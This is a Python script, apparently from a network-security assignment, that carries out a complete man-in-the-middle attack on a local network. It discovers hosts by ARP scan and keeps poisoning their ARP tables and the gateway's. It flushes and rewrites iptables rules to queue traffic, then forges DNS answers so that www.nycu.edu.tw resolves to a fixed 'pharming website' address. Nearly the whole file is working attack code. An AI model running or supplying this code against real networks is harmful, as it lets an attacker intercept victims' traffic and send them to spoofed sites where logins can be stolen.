#!/usr/bin/python3

import os
import netfilterqueue
import threading
import netifaces as ni
from scapy.all import *

# Get the IP address of the Wi-Fi interface
gateway = {'ip': ni.gateways()[ni.AF_INET][0][0], 'mac': 0}
lanip=gateway['ip']+'/24'
# Create an ARP request packet to get the MAC addresses of devices in the network
arp_request = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=lanip)

# Send the ARP request and get the responses
responses = srp(arp_request, timeout=1, verbose=False)[0]

victims=list()

# Print the IP/MAC addresses of devices in the network
print('-------------------------------------------')
print('IP\t\tMAC Address')
print('-------------------------------------------')
for response in responses:
    if response[1].psrc!=gateway['ip']:
        victims.append({'ip': response[1].psrc, 'mac': response[1].hwsrc})
        print(response[1].psrc + '\t' + response[1].hwsrc)
    else:
        gateway['mac'] = response[1].hwsrc

# clear ip table
os.system('sudo iptables -t nat -F')

# set net filter queue to save the packets
os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')

# multi-thread - send arp reply to poison arp table continuously

def arp_poison():
    while True:
        # Send arp reply to poison the victims' and the router's arp table
        for victim in victims:
            # default op=1 means arp request, op=2 means arp reply
            packet = ARP(op=2, pdst=victim['ip'], hwdst=victim['mac'], psrc=gateway['ip'])
            send(packet, verbose=False)
            packet = ARP(op=2, pdst=gateway['ip'], hwdst=gateway['mac'], psrc=victim['ip'])
            send(packet, verbose=False)

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    
    # if we get the DNS response from the DNS server
    if scapy_packet.haslayer(DNSRR):
       qname = scapy_packet[DNSQR].qname
       if b"www.nycu.edu.tw" in qname:
           # delete length and checksum field in TCP and UDP headers
           del scapy_packet[IP].len
           del scapy_packet[IP].chksum
           del scapy_packet[UDP].len
           del scapy_packet[UDP].chksum

           # forge DNS record to the pharming website
           scapy_packet[DNS].an = DNSRR(rrname=qname, rdata="140.113.207.241")
           scapy_packet[DNS].ancount = 1

           # set modified field back to the received packet and then forward it
           packet.set_payload(bytes(scapy_packet))

    # forward the packet
    packet.accept()

def run_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

threading.Thread(target=arp_poison).start()
threading.Thread(target=run_queue).start()
